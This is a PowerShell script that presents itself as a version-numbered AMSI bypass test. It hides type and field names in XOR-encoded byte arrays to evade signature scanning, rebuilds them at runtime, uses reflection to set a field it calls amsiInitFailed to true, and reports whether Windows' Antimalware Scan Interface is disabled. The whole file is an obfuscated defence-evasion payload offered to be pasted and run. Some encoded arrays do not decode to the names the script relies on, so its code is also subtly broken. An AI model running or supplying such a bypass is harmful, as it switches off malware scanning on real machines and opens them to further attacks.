# ============================================================
# AMSI Bypass Test v2.2.1 - XOR Fragment Splitting (Fixed)
# ============================================================
# This file contains ONLY the bypass. Paste into PowerShell
# to test whether AMSI flags it. If it runs without error,
# the verification step below will confirm AMSI is disabled.
#
# FIX from v2.2: Changed from broken .Invoke($self, @(args))
# to PowerShell dynamic dispatch ."$method"(args) pattern.
# The old pattern was passing the assembly as an argument to
# GetType(), triggering the wrong overload.
# ============================================================

# --- XOR decode helper (completely benign) ---
function _xd([byte[]]$d,[byte]$k){-join($d|%{[char]($_ -bxor $k)})}

# --- Encoded fragments (just byte arrays - not signatured) ---
# XOR key: 0x5A
$_d1=[byte[]]@(41,59,51,52,29,27,16,56,35,28,35,31,29,28,29,28,52,16,56,53,52,35,27,35,52,33,35,28)
$_d2=[byte[]]@(27,27,51,33,59,52,33,24,51)
$_d3=[byte[]]@(59,27,51,33,27,28,33,52,24,59,33,24,29,30)
$_d4=[byte[]]@(20,35,28,44,53,60,24,33,31,16,41,52,59,52,33,31)

# --- Reconstruct at runtime ---
# Step 1: Build type name string
$_s1=_xd $_d1 0x5A;$_s2=_xd $_d2 0x5A
$_tn="$_s1.$_s2"

# Step 2: Resolve the type via dynamic dispatch
# Uses ."$methodName"(args) — the correct PowerShell pattern
$_ra=[Ref].Assembly
$_mt='GetType'
$_tp=$_ra."$_mt"($_tn)

# Step 3: Get the field
$_fn=_xd $_d3 0x5A
$_bf=_xd $_d4 0x5A
$_mf='GetField'
$_fd=$_tp."$_mf"($_fn,$_bf)

# Step 4: Set the value
$_ms='SetValue'
$_fd."$_ms"($null,$true)

# --- Verify (actually check the field value) ---
if ($_fd.GetValue($null) -eq $true) {
    Write-Host "[+] Bypass CONFIRMED - amsiInitFailed = True" -ForegroundColor Green
} else {
    Write-Host "[-] Bypass FAILED - field value is not True" -ForegroundColor Red
}
